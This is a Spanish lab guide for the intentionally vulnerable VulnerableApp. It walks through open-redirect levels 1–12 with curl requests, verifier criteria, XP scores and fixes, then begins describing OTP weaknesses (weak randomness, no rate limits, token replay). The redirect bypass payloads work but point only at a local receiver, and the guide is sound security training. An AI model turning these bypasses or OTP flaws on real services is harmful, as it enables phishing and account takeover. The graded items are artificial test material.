Añade a la lista negra de nivel 3 el prefijo del carácter nulo. Acepta cualquier valor que no empiece por http, https, //, www o el carácter nulo, o que sea exactamente la autoridad de la solicitud, y lo coloca en Location con 302.

La prueba de carácter nulo está Disabled porque construir el URI de RequestEntity con ese carácter produce URISyntaxException. El test activo usa /%09/localdomain.pw; aquí se conserva un marcador y receiver local, sin enviar un byte nulo.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5`

**Entrada:** {
  "returnTo": "cadena obligatoria; se examina también la autoridad de la RequestEntity"
}

Mantiene las exclusiones de nivel 4 y exige además que el primer carácter tenga valor Java mayor que 20 y que la cadena no sea vacía, salvo la excepción de igualdad con la autoridad. Los valores aceptados se copian a Location con 302.

Es una comprobación de caracteres/prefijos, no un análisis de URL. El test original acepta localdomain.pw/. El ejercicio usa receiver:8081/VA_LAB_OK y no sigue el Location; que un cliente pueda o no interpretar esa cadena como URL absoluta es una cuestión separada.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_6`

**Entrada:** {
  "returnTo": "cadena obligatoria, concatenada después de protocolo://autoridad de la solicitud"
}

No valida returnTo. Construye Location como requestUrl.getProtocol() + :// + requestUrl.getAuthority() + returnTo y responde 302.

El test original demuestra https://somedomain.comsomedomain.com. Un valor que empieza por @ puede cambiar el significado de autoridad al ser interpretado por un cliente URL; el ejercicio limita el host final a receiver:8081 y solo inspecciona la cabecera.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7`

**Entrada:** {
  "returnTo": "cadena obligatoria; si comienza con / se elimina una barra"
}

No valida el contenido. Quita una barra inicial si existe y construye Location como protocolo://autoridad de la solicitud + / + returnTo, con status 302.

Está anotado como AttackVector y copia entrada no validada al encabezado. A diferencia del nivel 6, la barra forzada suele conservar la autoridad local para entradas normales; por ello el resultado probado aquí es una construcción de Location controlada, no una promesa de salto cross-origin en todos los clientes.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_8`

**Entrada:** {
  "returnTo": "cadena obligatoria; solo / y /VulnerableApp/ están permitidos"
}

Usa WHITELISTED_URLS y solo devuelve 302 con Location para / o /VulnerableApp/. Para cualquier otro valor devuelve 200 sin Location.

Es la primera variante segura de contraste. La comparación es exacta y permite únicamente dos destinos relativos predefinidos. No tiene AttackVector, aunque sí una anotación de ruta con variant SECURE.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_9`

**Entrada:** {
  "returnTo": "cadena obligatoria; URL o ruta arbitraria"
}

Devuelve 302 y copia cualquier returnTo a Location. La plantilla describe la progresión hacia phishing y usa originalmente /VulnerableApp/phishing/fake-login.html.

Es un endpoint de phishing sin advertencia. El ejercicio no usa una página de login ni captura credenciales: apunta únicamente al receptor inocuo local y no sigue la redirección.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_10`

**Entrada:** {
  "returnTo": "cadena obligatoria; URL o ruta arbitraria"
}

El método de servidor es igual de permisivo que el nivel 9: devuelve 302 y copia el valor a Location. La advertencia/interstitial y el botón Continue existen en JavaScript y solo afectan a la experiencia de la interfaz.

La advertencia no es un control de servidor: una solicitud curl llega directamente al endpoint y no hace clic. No se debe atribuir puntuación por mostrar, cerrar o pulsar la ventana; la evidencia reproducible es la respuesta HTTP.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_11`

**Entrada:** {
  "returnTo": "cadena obligatoria; solo / y /VulnerableApp/ pasan la lista blanca"
}

Para un valor permitido responde 302 con Location; para un destino no permitido responde 403 con el cuerpo Redirect blocked: untrusted redirect target y sin Location.

Es el control seguro de allowlist usado por la plantilla interactiva. Bloquea tanto destinos externos como rutas internas no aprobadas, por ejemplo /VulnerableApp/phishing/fake-login.html.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_12`

**Entrada:** {
  "returnTo": "cadena obligatoria usada como destinationKey; valores válidos: home y root"
}

Nunca usa el valor recibido como URL. Busca returnTo como clave en REDIRECT_DESTINATIONS; home se transforma en /VulnerableApp/ y root en /. Una clave desconocida responde 400 con Redirect blocked: unknown destination y sin Location.

Es la defensa por referencia indirecta. Las pruebas recorren URLs, esquemas, variantes de barras, javascript: y claves con espacios/mayúsculas, y esperan rechazo; el valor del solicitante no alcanza Location.

### openRedirect-01 · Nivel 1: Location directo hacia el receptor local

302 Found con Location: http://receiver:8081/VA_LAB_OK. Como no se usa -L, curl no contacta al receptor.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El método getVulnerablePayloadLevel1 pasa siempre el validador true y agrega returnTo sin transformación. El receptor solo sirve como destino de laboratorio, no como sitio externo real.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_1 --data-urlencode 'returnTo=http://receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-01 --method GET --param returnTo=http://receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "http://receiver:8081/VA_LAB_OK",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

Inspecciona la primera línea HTTP y la cabecera Location; no agregues -L.

El valor controlado debe ser un receptor local del laboratorio, no un dominio de Internet.

**Corrección recomendada:** No aceptar una URL arbitraria. Preferir una allowlist exacta de rutas internas o una referencia indirecta a destinos conocidos; si se permiten URLs externas, validar esquema, host, puerto y representación normalizada en un componente de URL.

### openRedirect-02 · Nivel 2: una lista negra de prefijos acepta un esquema alternativo inocuo

302 Found con Location: ftp://receiver:8081/VA_LAB_OK, porque el valor no empieza por http, https ni www.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La validación por prefijo no reconoce todos los esquemas. El ejercicio reproduce la clase de bypass que el test original expresa con ftp://ftp.dlptest.com/, pero usa un nombre local y no sigue el resultado.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_2 --data-urlencode 'returnTo=ftp://receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-02 --method GET --param returnTo=ftp://receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "ftp://receiver:8081/VA_LAB_OK",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

El método también compara el valor con la autoridad de la solicitud, pero esa igualdad no corrige la aceptación de esquemas alternativos.

La ausencia de -L es deliberada y evita cualquier conexión al destino.

**Corrección recomendada:** Usar un parser de URL y una política positiva: en este caso, permitir solo rutas relativas o una lista explícita de hosts/esquemas autorizados. No confundir que un string no empiece por http con que sea seguro.

### openRedirect-03 · Nivel 3: el filtro de // aún deja pasar una forma codificada

302 Found con Location: /%09/receiver:8081/VA_LAB_OK; el backend acepta el valor porque no comienza por http, https, // ni www.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El valor reproduce el payload documentado /%09/localdomain.pw sin usar un dominio real. Se verifica la copia al encabezado, no que un navegador convierta el tab codificado en un salto fuera de origen.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_3 --data-urlencode 'returnTo=/%09/receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-03 --method GET --param returnTo=/%09/receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "/%09/receiver:8081/VA_LAB_OK",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

--data-urlencode hace reproducible el transporte del signo %; revisa la Location que devuelve la aplicación.

No uses una URL pública ni sigas la respuesta.

**Corrección recomendada:** Normalizar y analizar el destino antes de validarlo, rechazar controles/codificaciones ambiguas y preferir referencias internas. La validación debe ocurrir sobre una representación canónica y no solo sobre prefijos de la cadena original.

### openRedirect-04 · Nivel 4: excluir un único byte nulo no cubre el marcador de control

302 Found con Location: /%09/receiver:8081/VA_LAB_OK. La ruta de carácter nulo no se ejecuta en este ejercicio porque el propio test original la tiene Disabled por URISyntaxException.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El filtro añade NULL_BYTE_CHARACTER a la lista negra, pero sigue aceptando el valor que comienza por / y contiene la representación textual %09. No se envía un byte nulo ni se intenta evadir el entorno del laboratorio.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_4 --data-urlencode 'returnTo=/%09/receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-04 --method GET --param returnTo=/%09/receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "/%09/receiver:8081/VA_LAB_OK",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

El resultado esperado es la cabecera, no una navegación automática.

La prueba Disabled del repositorio es una incertidumbre documentada, no una razón para afirmar que un byte nulo funcionaría por HTTP.

**Corrección recomendada:** Rechazar caracteres de control y entradas ambiguas después de decodificar, y aplicar una allowlist de destinos; no ampliar indefinidamente una lista negra de bytes y prefijos.

### openRedirect-05 · Nivel 5: la condición charAt permite una cadena no bloqueada

302 Found con Location: receiver:8081/VA_LAB_OK, porque la cadena no empieza por los prefijos bloqueados, no está vacía y su primer carácter r supera 20.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El test unitario usa localdomain.pw/ para mostrar que una cadena ordinaria que evita la lista negra llega a Location. Aquí se usa receiver:8081 como marcador local; no se afirma que todos los clientes interpreten este valor sin esquema como un destino absoluto.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_5 --data-urlencode 'returnTo=receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-05 --method GET --param returnTo=receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "receiver:8081/VA_LAB_OK",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

Comprueba el valor exacto de Location y el status 302.

La falta de -L mantiene el ejercicio dentro de una inspección de respuesta.

**Corrección recomendada:** No basar la política en charAt ni en listas de prefijos. Parsear un URL normalizado o permitir solamente identificadores/rutas previamente registrados.

### openRedirect-06 · Nivel 6: concatenación de autoridad con un receptor local

302 Found con Location: http://target:9090@receiver:8081/VA_LAB_OK para la URL base del laboratorio; el valor demuestra la concatenación sin validación.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El servidor antepone el protocolo y la autoridad de la solicitud a cualquier texto recibido. El carácter @ permite estudiar, sin navegar, cómo una biblioteca de URL podría interpretar la primera parte como userinfo y receiver como host.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_6 --data-urlencode 'returnTo=@receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-06 --method GET --param returnTo=@receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "http://target:9090@receiver:8081/VA_LAB_OK",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

La cabecera esperada depende de la autoridad de la URL solicitada, aquí target:9090.

No uses -L: la finalidad es observar la cabecera que compone el servidor.

**Corrección recomendada:** Construir redirecciones desde destinos internos registrados, no por concatenación. Si existe una política de URLs externas, parsear y validar host, puerto, esquema y userinfo, y rechazar userinfo.

### openRedirect-07 · Nivel 7: barra forzada y Location construida por concatenación

302 Found con Location: http://target:9090//receiver:8081/VA_LAB_OK; el método elimina una barra y luego añade otra.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El nivel se presenta como defensa por prefijo de dominio, pero no valida returnTo: modifica solo una barra y concatena el resultado. Esta prueba permite distinguir una cabecera controlada de un open redirect cross-origin efectivo; con este valor concreto la autoridad sigue siendo target:9090.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7 --data-urlencode 'returnTo=//receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-07 --method GET --param returnTo=//receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "http://target:9090//receiver:8081/VA_LAB_OK",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

Cuenta las dos barras que aparecen después de target:9090.

No conviertas esta cabecera en una afirmación de salto externo sin verificar el parsing del cliente; curl sin -L es el control seguro.

**Corrección recomendada:** No fabricar URLs por concatenación. Usar rutas internas canónicas o un registro de destinos y verificar explícitamente que el URL resuelto conserva el origen permitido.

### openRedirect-08 · Nivel 8: control positivo de allowlist

302 Found con Location: /, porque / es uno de los dos destinos permitidos.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este es el control positivo de la lista blanca WHITELISTED_URLS. La respuesta confirma que una ruta aprobada sigue funcionando sin aceptar una URL arbitraria.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_8 --data-urlencode 'returnTo=/'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-08 --method GET --param returnTo=/

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "/",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

Contrasta esta respuesta con el mismo endpoint usando /not-allowlisted.

Un 302 aquí no demuestra vulnerabilidad: es el comportamiento esperado para el destino aprobado.

**Corrección recomendada:** Mantener la allowlist pequeña, exacta y basada en rutas internas; revisar que la normalización no transforme una ruta no permitida en una aprobada.

### openRedirect-09 · Nivel 8: control negativo de allowlist

200 OK sin cabecera Location, porque /not-allowlisted no pertenece a la lista exacta.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

Este control negativo debe ejecutarse junto con el positivo. La ausencia de Location, además del status 200 que se observa en la salida de curl, es la señal de que el destino no fue redirigido.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_8 --data-urlencode 'returnTo=/not-allowlisted'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-09 --method GET --param returnTo=/not-allowlisted

**Criterio del verificador:**

```json
{
  "kind": "absent_header",
  "header": "Location",
  "status": 200
}
```

**Pistas:**

Revisa manualmente que la primera línea sea 200 y que no aparezca Location; el kind not_contains no comprueba el status.

No atribuyas vulnerabilidad por el mero hecho de que el endpoint exista.

**Corrección recomendada:** Conservar la política de allowlist y probar siempre tanto destinos permitidos como no permitidos, incluidos externos y rutas internas no aprobadas.

### openRedirect-10 · Nivel 9: redirección de phishing simulada al receptor local

302 Found con Location: http://receiver:8081/VA_LAB_OK, sin validación ni advertencia de servidor.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La plantilla describe la progresión de phishing, pero el laboratorio no usa credenciales ni una página de login. La prueba se limita a demostrar que el endpoint puede emitir un destino elegido por el solicitante.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_9 --data-urlencode 'returnTo=http://receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-10 --method GET --param returnTo=http://receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "http://receiver:8081/VA_LAB_OK",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

El receptor es local y la orden no sigue redirecciones.

El status 302 y Location son evidencia de la decisión del servidor; no es necesario hacer clic.

**Corrección recomendada:** Aplicar allowlist o referencia indirecta y evitar que un parámetro de retorno acepte URLs completas. Una advertencia de UI no sustituye al bloqueo en servidor.

### openRedirect-11 · Nivel 10: la advertencia visual no cambia el endpoint permisivo

302 Found con Location: http://receiver:8081/VA_LAB_OK. curl llega directamente al método y no interactúa con el interstitial JavaScript.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La plantilla muestra una advertencia y un botón Continue, pero el método getVulnerablePayloadLevel10 sigue aplicando el validador siempre verdadero. El ejercicio demuestra por qué una decisión de UI no es una mitigación de servidor.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_10 --data-urlencode 'returnTo=http://receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-11 --method GET --param returnTo=http://receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "http://receiver:8081/VA_LAB_OK",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

No pulses enlaces ni asignaciones de puntaje por click; la prueba es la respuesta HTTP directa.

No uses -L y no envíes credenciales.

**Corrección recomendada:** Bloquear destinos no confiables en el endpoint, independientemente de la interfaz. Si se mantiene una advertencia, tratarla como ayuda al usuario y no como control de autorización.

### openRedirect-12 · Nivel 11: control positivo de allowlist segura

302 Found con Location: /VulnerableApp/, porque es un destino interno aprobado.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El método seguro conserva una navegación interna aprobada. Este control positivo debe compararse con un destino receiver y con una ruta interna no aprobada.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_11 --data-urlencode 'returnTo=/VulnerableApp/'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-12 --method GET --param returnTo=/VulnerableApp/

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "/VulnerableApp/",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

Un 302 permitido no implica open redirect; comprueba que Location es exactamente la ruta de la lista.

Contrasta con el ejercicio de bloqueo del mismo nivel.

**Corrección recomendada:** Mantener la allowlist del lado servidor y devolver un error explícito cuando el valor no pertenezca a ella.

### openRedirect-13 · Nivel 11: control negativo bloquea el receptor externo

403 Forbidden con cuerpo Redirect blocked: untrusted redirect target y sin Location.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El servidor bloquea el destino local no aprobado. La comprobación del cuerpo debe complementarse con la inspección manual de que no existe Location; receiver no debe recibir ninguna petición porque no se usa -L.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_11 --data-urlencode 'returnTo=http://receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-13 --method GET --param returnTo=http://receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "Redirect blocked: untrusted redirect target",
  "status": 403
}
```

**Pistas:**

Confirma status 403, el texto de bloqueo y ausencia de Location.

No confundas un body 403 con una navegación: la respuesta no debe seguirse.

**Corrección recomendada:** No relajar la lista blanca para acomodar cualquier URL. Si la aplicación necesita más destinos, añádalos como entradas explícitas y revisadas.

### openRedirect-14 · Nivel 12: clave conocida resuelta indirectamente

302 Found con Location: /VulnerableApp/. home es una clave, no una URL suministrada al encabezado.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La tabla interna traduce home a /VulnerableApp/. El valor recibido no se concatena ni se copia a Location, por lo que los payloads de URL no tienen un destino directo donde actuar.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_12 --data-urlencode 'returnTo=home'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-14 --method GET --param returnTo=home

**Criterio del verificador:**

```json
{
  "kind": "header",
  "value": "/VulnerableApp/",
  "header": "Location",
  "status": 302
}
```

**Pistas:**

El nombre del parámetro HTTP sigue siendo returnTo aunque el argumento Java se llame destinationKey.

Contrasta con el ejercicio de clave desconocida y observa que Location solo contiene la ruta mapeada.

**Corrección recomendada:** Usar identificadores opacos o nombres enumerados que se resuelvan en el servidor; rechazar cualquier clave no conocida.

### openRedirect-15 · Nivel 12: clave desconocida rechazada

400 Bad Request con cuerpo Redirect blocked: unknown destination y sin Location.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Incluso un URL local seguro es rechazado porque no es una de las claves home o root. Esto prueba la propiedad relevante: la entrada no llega al encabezado como destino.

```bash
curl -i --get http://target:9090/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_12 --data-urlencode 'returnTo=http://receiver:8081/VA_LAB_OK'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request openRedirect-15 --method GET --param returnTo=http://receiver:8081/VA_LAB_OK

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "Redirect blocked: unknown destination",
  "status": 400
}
```

**Pistas:**

Confirma 400, el mensaje exacto y ausencia de Location.

Que la respuesta sea 400 no prueba por sí solo una propiedad de otras familias como IDOR; aquí solo acredita el rechazo de una clave de redirección.

**Corrección recomendada:** Mantener la resolución indirecta y tratar los cambios de la tabla como configuración revisada; no añadir un fallback que copie el valor desconocido a Location.

### Límites de esta familia

{
  "scope": "Se inspeccionó únicamente src/main/java/org/sasanlabs/service/vulnerability/openRedirect, su test directo, sus plantillas/mensajes y la referencia SAST de CWE-601. No se investigaron otras familias ni se ejecutó una navegación con navegador.",
  "inactive_originals": [
    "ClientSideInjection.java contiene solo una clase vacía y no aporta rutas.",
    "RefreshHeaderBasedInjection.java contiene solo una clase vacía y no aporta rutas.",
    "MetaTagBasedInjection.java contiene la anotación de controlador y dos métodos completamente comentados; por tanto, la plantilla MetaTagBasedInjection/LEVEL_1 existente no demuestra un endpoint activo en este commit.",
    "No existe un archivo de recursos src/main/resources/attackvectors/*OpenRedirect*; los textos de challenge/payload de esta familia están en src/main/resources/i18n/messages.properties."
  ],
  "runtime_uncertainties": [
    "La verificación estática confirma los status y cabeceras que construye el código, pero no garantiza que el despliegue Docker, proxy o cliente normalice exactamente cada URL codificada como lo hace el test unitario.",
    "Los niveles 2 a 5 dependen de RequestEntity.getUrl().getAuthority(); el valor esperado de los ejercicios usa la autoridad indicada por la URL base target:9090.",
    "La prueba de byte nulo de niveles 4 y 5 está deshabilitada en el repositorio por URISyntaxException; no se debe afirmar que ese payload sea reproducible por HTTP.",
    "Las plantillas activas solo están materializadas para LEVEL_1 y LEVEL_9 a LEVEL_12; los niveles 2 a 8 apuntan por anotación a htmlTemplate LEVEL_1/Http3xxStatusCodeBasedInjection."
  ],
  "verificador_sugerido": {
    "procedure": [
      "Ejecutar las órdenes curl -i --get exactamente como están, sin -L, y guardar la respuesta completa.",
      "Para un nivel vulnerable, exigir conjuntamente el status 302 y una cabecera Location cuyo valor coincida con el comportamiento descrito; una cadena reflejada en otra parte de la respuesta no basta.",
      "Para un control seguro, comprobar el status esperado, el cuerpo de rechazo cuando corresponde y la ausencia de Location; un 200 aislado no demuestra una propiedad de autorización ni IDOR.",
      "Usar receiver:8081 solo como receptor local inocuo si se necesita seguir manualmente una prueba separada; la colección aquí no lo sigue y no usa Mailpit.",
      "No atribuir puntaje por hacer click en los enlaces de las plantillas. En el nivel 10, ver la advertencia no demuestra mitigación; la decisión relevante está en el endpoint.",
      "La reflexión de una cadena no prueba ejecución XSS; aunque XSS no es un nivel de esta familia, cualquier verificador debe distinguir bytes reflejados de ejecución DOM."
    ],
    "interpretation": "La evidencia mínima honesta para open redirect es una respuesta HTTP del servidor que emite un salto no permitido (normalmente 3xx más Location) y una comparación con controles positivos/negativos. No se debe afirmar que un navegador llegó al destino, que un receptor recibió información o que se obtuvo phishing real solo por observar una cabecera."
  },
  "safety": "Los payloads se limitan a receiver:8081, rutas locales y el marcador VA_LAB_OK; no incluyen comandos, reverse shells, lectura de secretos, DoS, borrado de datos ni captura de credenciales."
}

## Validación y reutilización de códigos OTP

La familia OTP implementa solicitudes y validaciones de contraseñas de un solo uso. El controlador OTPVulnerability está anotado con @VulnerableAppRestController(value = "OTPVulnerability") y cada solicitud de nivel usa @VulnerableAppRequestMapping(value = LEVEL_n, requestMethod = POST); por ello, con el contexto indicado, la ruta de solicitud es /VulnerableApp/OTPVulnerability/LEVEL_n y la validación adicional es /VulnerableApp/OTPVulnerability/LEVEL_n/validate. Los formularios usan application/x-www-form-urlencoded y los parámetros son email para solicitar y email más otp para validar. OTPUserSeeder crea tres usuarios por nivel: level1_user1@sasanlabs.org a level1_user3@sasanlabs.org, y el patrón equivalente para los niveles 2 a 5. La progresión original va desde un OTP de cuatro dígitos con Random, sin vencimiento ni límite de intentos, hasta un OTP de seis dígitos con SecureRandom, vencimiento, HMAC en memoria, límite de solicitudes, límite de intentos y uso único. El objeto JSON de respuesta siempre tiene content e isValid; un HTTP 200 por sí solo no expresa que la autenticación haya sido válida. Los metadatos @AttackVector y @ChallengeCard de los niveles 1 a 4 están en OTPVulnerability.java y sus textos en messages.properties; la búsqueda acotada no encontró un archivo separado de src/main/resources/attackvectors para OTP. El análisis y los ejercicios se basan en el commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y describen verificaciones esperadas por código, no resultados observados en ejecución.

### Todos los niveles originales

#### `POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_1`

**Entrada:** {
  "request": {
    "email": "level1_user1@sasanlabs.org"
  },
  "validate_route": "http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_1/validate",
  "validate": {
    "email": "level1_user1@sasanlabs.org",
    "otp": "cadena de 4 dígitos recibida en Mailpit"
  }
}

requestOTPLevel1 consulta el usuario por email y nivel, genera String.format("%04d", new Random().nextInt(10000)), guarda ese valor sin transformar aunque el campo se llame otpHash, no asigna expiresAt y envía el OTP por correo si el usuario existe. La respuesta de solicitud es genérica y success incluso si no existe el usuario. validateOTPLevel1 busca el token más reciente y compara el valor recibido con el valor guardado; no comprueba expiración, no incrementa attempts, no consulta used y no tiene rate limit. El espacio de búsqueda es de 10.000 valores, pero este informe no recomienda recorrerlo ni genera esa carga.

@AttackVector declara WEAK_RANDOM_NUMBER_GENERATION, NO_LOGIN_RATE_LIMITING y PASSWORD_RESET_TOKEN_WITHOUT_EXPIRY. Los textos de challenge describen autenticar a level1_user1@sasanlabs.org sin conocer su OTP y el payload original describe fuerza bruta de 0000 a 9999; se documenta solo como riesgo de código, no como procedimiento de fuerza bruta. OTPVulnerabilityTest cubre delegación, y OTPServiceTest comprueba solicitud con y sin usuario y validación correcta/incorrecta. La ruta /validate es un @PostMapping separado, no una segunda @VulnerableAppRequestMapping.

#### `POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_2`

**Entrada:** {
  "request": {
    "email": "level2_user1@sasanlabs.org"
  },
  "validate_route": "http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_2/validate",
  "validate": {
    "email": "level2_user1@sasanlabs.org",
    "otp": "cadena de 6 dígitos recibida en Mailpit"
  }
}

requestOTPLevel2 crea Random con System.currentTimeMillis(), obtiene un OTP de seis dígitos, lo guarda sin hash y sin vencimiento, y envía el valor por correo cuando el usuario existe. La semilla temporal hace predecible la secuencia si un atacante conoce o acota el instante de generación, pero no hay una prueba de predicción en este informe. La validación solo compara el valor contra el último token y, como no hay contador, used ni expiresAt, no limita intentos ni vencimiento. La solicitud también devuelve respuesta genérica y success para un usuario no sembrado.

@AttackVector declara WEAK_RANDOM_NUMBER_GENERATION, NO_LOGIN_RATE_LIMITING y PASSWORD_RESET_TOKEN_WITHOUT_EXPIRY. Los textos del nivel describen predecir el OTP con la semilla basada en tiempo. No hay una prueba unitaria de servicio específica de LEVEL_2 en los tests leídos; la conclusión de la semilla y de la ausencia de límites proviene directamente de OTPService.java. La validación permite reutilizar el mismo valor mientras exista el último registro.

#### `POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_3`

**Entrada:** {
  "request": {
    "email": "level3_user1@sasanlabs.org"
  },
  "validate_route": "http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_3/validate",
  "validate": {
    "email": "level3_user1@sasanlabs.org",
    "otp": "cadena de 6 dígitos recibida en Mailpit"
  }
}

requestOTPLevel3 usa SecureRandom para un OTP de seis dígitos y fija expiresAt a cinco minutos. validateOTPLevel3 exige igualdad y que la hora actual sea anterior al vencimiento, pero nunca marca el token como usado ni aumenta attempts. Por tanto, el mismo OTP válido puede ser aceptado de nuevo dentro de su ventana de cinco minutos y no existe límite de intentos.

@AttackVector declara REUSABLE_PASSWORD_RESET_TOKEN y NO_LOGIN_RATE_LIMITING. OTPServiceTest contiene validateOTPLevel3_ShouldSucceedTwice_DemonstratingReplayVulnerability y también prueba el rechazo de un token expirado. El control positivo de este nivel es precisamente la segunda validación con el mismo OTP; el resultado esperado se debe verificar en isValid, no en el estado HTTP.

#### `POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4`

**Entrada:** {
  "request": {
    "email": "level4_user1@sasanlabs.org"
  },
  "validate_route": "http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_4/validate",
  "validate": {
    "email": "level4_user1@sasanlabs.org",
    "otp": "cadena de 6 dígitos recibida en Mailpit"
  }
}

requestOTPLevel4 usa SecureRandom, guarda un OTP de seis dígitos con vencimiento de cinco minutos y no limita cuántas solicitudes nuevas se pueden hacer. validateOTPLevel4 serializa por email:nivel, rechaza cuando attempts ya es 3 o más, incrementa attempts antes de comparar y marca used tras un éxito. Sin embargo, nunca comprueba used antes de aceptar: el mismo OTP exitoso puede volver a pasar mientras no se hayan consumido los tres intentos y no haya vencido. Solicitar un token nuevo crea otro registro con attempts en cero, por lo que el límite de intentos no es un límite de solicitudes.

@AttackVector declara NO_LOGIN_RATE_LIMITING y el texto del nivel destaca la generación ilimitada. OTPServiceTest prueba el rechazo con attempts=3 y que used se marca después de un éxito, pero no prueba el replay que se deduce de la ausencia de la comprobación isUsed() en validateOTPLevel4. Esta observación adicional debe tratarse como hallazgo de revisión de código y confirmarse de forma acotada con una segunda validación, no con muchas solicitudes.

#### `POST http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_5`

**Entrada:** {
  "request": {
    "email": "level5_user1@sasanlabs.org"
  },
  "validate_route": "http://target:9090/VulnerableApp/OTPVulnerability/LEVEL_5/validate",
